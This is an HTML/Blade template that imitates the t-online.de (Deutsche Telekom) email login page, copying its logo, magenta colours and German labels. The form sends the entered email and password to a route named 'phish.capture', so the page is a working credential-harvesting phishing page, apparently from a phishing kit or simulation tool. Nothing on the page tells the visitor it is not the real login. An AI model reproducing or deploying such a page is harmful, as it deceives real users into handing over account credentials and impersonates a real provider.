<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>t-online.de</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Roboto, Arial, sans-serif;
            background: #e8e8e8;
            color: #171b26;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 24px;
            background: #fff;
            height: 56px;
            border-bottom: 1px solid #d8d8d8;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }

        .logo-telekom {
            width: 40px;
            height: 40px;
            position: relative;
        }

        .logo-telekom .t-letter {
            font-size: 28px;
            font-weight: 700;
            color: #e20074;
            line-height: 1;
        }

        .logo-dots {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .logo-dots span {
            position: absolute;
            width: 6px;
            height: 6px;
            background: #e20074;
            border-radius: 50%;
        }

        .logo-dots span:nth-child(1) { top: 0; left: 8px; }
        .logo-dots span:nth-child(2) { top: 0; right: 8px; }
        .logo-dots span:nth-child(3) { top: 8px; left: 0; }
        .logo-dots span:nth-child(4) { top: 8px; right: 0; }
        .logo-dots span:nth-child(5) { bottom: 0; left: 8px; }
        .logo-dots span:nth-child(6) { bottom: 0; right: 8px; }

        .logo-text {
            font-size: 16px;
            font-weight: 500;
            color: #171b26;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .header-right a {
            font-size: 14px;
            color: #171b26;
            text-decoration: none;
        }

        .header-right a:hover { text-decoration: underline; }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            padding-top: 60px;
        }

        .login-card {
            background: #fff;
            border-radius: 16px;
            padding: 48px 40px;
            width: 400px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        }

        .login-card h1 {
            font-size: 24px;
            font-weight: 700;
            color: #171b26;
            margin-bottom: 32px;
        }

        .field-group {
            margin-bottom: 20px;
            position: relative;
        }

        .field-group label {
            display: block;
            font-size: 14px;
            font-weight: 400;
            color: #171b26;
            margin-bottom: 8px;
        }

        .field-group input {
            width: 100%;
            height: 48px;
            padding: 0 16px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            color: #171b26;
            background: #fff;
            border: 1px solid #b0b0b0;
            border-radius: 8px;
            outline: none;
        }

        .field-group input:focus {
            border-color: #e20074;
            box-shadow: 0 0 0 1px #e20074;
        }

        .field-group input::placeholder {
            color: #737373;
            font-weight: 400;
        }

        .forgot-link {
            display: block;
            font-size: 14px;
            color: #e20074;
            text-decoration: none;
            margin-bottom: 28px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .btn-login {
            width: 100%;
            height: 48px;
            font-size: 16px;
            font-weight: 700;
            font-family: inherit;
            color: #fff;
            background: #e20074;
            border: none;
            border-radius: 24px;
            cursor: pointer;
            margin-bottom: 24px;
        }

        .btn-login:hover { background: #c70066; }

        .register-link {
            text-align: center;
            font-size: 14px;
            color: #171b26;
        }

        .register-link a {
            color: #e20074;
            text-decoration: none;
            font-weight: 500;
        }

        .register-link a:hover { text-decoration: underline; }

        footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 24px;
            padding: 20px 24px;
            font-size: 12px;
            color: #737373;
            border-top: 1px solid #d8d8d8;
            background: #fff;
        }

        footer a {
            color: #737373;
            text-decoration: none;
        }

        footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header>
        <a href="#" class="logo">
            <div class="logo-telekom">
                <div class="logo-dots">
                    <span></span><span></span><span></span><span></span><span></span><span></span>
                </div>
                <div class="t-letter">T</div>
            </div>
            <span class="logo-text">E-Mail</span>
        </a>
        <div class="header-right">
            <a href="#">Hilfe</a>
        </div>
    </header>

    <main>
        <div class="login-card">
            <h1>E-Mail-Adresse oder Mobilfunknummer</h1>

            <form method="POST" action="{{ route('phish.capture', ['provider' => 'telekom', 'token' => $token ?? '']) }}">
                @csrf
                <input type="hidden" name="_token" value="{{ csrf_token() }}">

                <div class="field-group">
                    <label for="email">E-Mail-Adresse oder Mobilfunknummer</label>
                    <input type="text" id="email" name="email" required autocomplete="username" autofocus>
                </div>

                <div class="field-group">
                    <label for="password">Passwort</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                </div>

                <a href="#" class="forgot-link">Passwort vergessen?</a>

                <button type="submit" class="btn-login">Anmelden</button>
            </form>

            <div class="register-link">
                Noch kein E-Mail-Account? <a href="#">Registrieren</a>
            </div>
        </div>
    </main>

    <footer>
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
    </footer>
</body>
</html>
